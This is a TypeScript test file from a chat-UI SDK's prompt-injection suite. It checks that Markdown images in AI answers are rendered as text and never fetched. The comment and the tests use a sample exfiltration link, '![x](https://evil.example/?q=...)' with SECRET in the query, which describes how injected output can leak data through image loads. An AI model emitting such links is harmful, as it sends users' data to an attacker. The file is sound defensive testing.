import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { englishStrings, markdownToHtml, parseMarkdown, type Inline, type MarkdownBlock } from "@fadenstack/ui";
import { Markdown } from "@fadenstack/ui-react";

import { loadCorpus } from "./rig.js";

// Gate G4 of the injection suite (sdk/51 7.1): a remote image in an answer is never loaded on its own. The Markdown model has an
// `image` inline (its alt text and its address); no skin turns it into an <img>: React and Vue draw "[alt]" with the address as a
// tooltip (the Vue skin is checked in packages/ui-vue/test/injectionImages.test.ts), and `markdownToHtml` (the export) writes the alt text. So "![x](https://evil.example/?q=...)" does not leave the device.
// OWASP LLM01/LLM02; ASVS 5.0 V1 and V13 (no automatic outbound request). The same corpus as the .NET SDK's
// tests/Fadenstack.UI.Tests/Injection/ImageNeverLoadedTests.cs, where the model has no image at all.

const corpus = loadCorpus();

/** An element the browser would fetch something for. Escaped text ("&lt;img") is not one. */
const FETCHES = /<(img|picture|source|video|audio|iframe|embed|object|link|script|svg|image)[\s>/]/iu;

function inlinesOf(blocks: readonly MarkdownBlock[]): Inline[] {
  const out: Inline[] = [];
  const walk = (list: readonly Inline[]) => {
    for (const inline of list) {
      out.push(inline);
      if ("children" in inline && Array.isArray(inline.children)) walk(inline.children as Inline[]);
    }
  };
  const visit = (block: MarkdownBlock) => {
    const any = block as unknown as Record<string, unknown>;
    if (Array.isArray(any["inlines"])) walk(any["inlines"] as Inline[]);
    for (const key of ["blocks", "items", "rows"]) {
      if (Array.isArray(any[key])) for (const child of any[key] as unknown[]) {
        const c = child as Record<string, unknown>;
        if (typeof c["kind"] === "string") visit(child as MarkdownBlock);
        else if (Array.isArray(c["blocks"])) for (const b of c["blocks"] as MarkdownBlock[]) visit(b);
        else if (Array.isArray(c["cells"])) for (const cell of c["cells"] as Inline[][]) walk(cell);
      }
    }
    if (Array.isArray(any["header"])) for (const cell of any["header"] as Inline[][]) walk(cell);
  };
  blocks.forEach(visit);
  return out;
}

describe("G4: a remote image in an answer is never loaded", () => {
  it("the Markdown image becomes an image inline with its alt text and address, nothing more", () => {
    const blocks = parseMarkdown("Look: ![status](https://evil.example/pixel.png?q=SECRET)");
    const images = inlinesOf(blocks).filter((i) => i.kind === "image");
    expect(images).toHaveLength(1);
    expect(images[0]).toEqual({ kind: "image", alt: "status", href: "https://evil.example/pixel.png?q=SECRET" });
  });

  it("React draws it as text with a tooltip, not as an image", () => {
    const blocks = parseMarkdown("Look: ![status](https://evil.example/pixel.png?q=SECRET)");
    const html = renderToStaticMarkup(createElement(Markdown, { blocks, strings: englishStrings }));
    expect(html).toContain("[status]");
    expect(html).not.toMatch(FETCHES);
  });

  for (const c of corpus) {
    it(`${c.id}: as an answer, no skin and no export makes anything the browser would fetch`, () => {
      const blocks = parseMarkdown(c.content);
      const react = renderToStaticMarkup(createElement(Markdown, { blocks, strings: englishStrings }));
      const exported = markdownToHtml(c.content);
      for (const html of [react, exported]) expect(html).not.toMatch(FETCHES);
    });
  }
});
